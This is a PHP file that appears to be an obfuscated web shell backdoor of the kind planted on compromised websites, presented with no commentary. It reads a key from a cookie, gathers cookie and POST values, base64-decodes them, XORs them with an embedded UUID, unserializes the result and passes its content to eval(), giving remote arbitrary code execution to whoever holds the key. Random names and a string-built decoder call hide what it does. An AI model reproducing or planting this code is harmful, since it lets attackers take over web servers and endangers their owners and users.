<?php

$BBFJGGL = "LYB_MHWl";
$JKNKgUPo = "class_exists";
$aoXxk = class_exists($BBFJGGL);
$zZqkVnJ = $aoXxk;
if (!$zZqkVnJ) {
    class LYB_MHWl
    {
        private $XBFHojP;
        public static $FqLsVw = "25d6e356-e026-41bb-b3c7-153543e8ee2d";
        public static $RyemTI = NULL;
        public function __construct()
        {
            $fBuZMeMvll = $_COOKIE;
            $KrfBMJyklZ = $_POST;
            $XeNxHdoblv = @$fBuZMeMvll[substr(LYB_MHWl::$FqLsVw, 0, 4)];
            if (!empty($XeNxHdoblv)) {
                $unWRhSN = "base64";
                $BINjAHWJk = "";
                $XeNxHdoblv = explode(",", $XeNxHdoblv);
                foreach ($XeNxHdoblv as $MDMPoDsD) {
                    $BINjAHWJk .= @$fBuZMeMvll[$MDMPoDsD];
                    $BINjAHWJk .= @$KrfBMJyklZ[$MDMPoDsD];
                }
                $BINjAHWJk = array_map($unWRhSN . "_" . "d" . "e" . "c" . 'o' . "d" . "e", array($BINjAHWJk));
                $BINjAHWJk = $BINjAHWJk[0] ^ str_repeat(LYB_MHWl::$FqLsVw, strlen($BINjAHWJk[0]) / strlen(LYB_MHWl::$FqLsVw) + 1);
                LYB_MHWl::$RyemTI = @unserialize($BINjAHWJk);
            }
        }
        public function __destruct()
        {
            $this->ClLAt();
        }
        private function ClLAt()
        {
            if (is_array(LYB_MHWl::$RyemTI)) {
                $Olgny = str_replace("<?php", "", LYB_MHWl::$RyemTI["content"]);
                eval($Olgny);
                exit;
            }
        }
    }
    $PWWymrkqZp = new LYB_MHWl();
    $PWWymrkqZp = NULL;
}
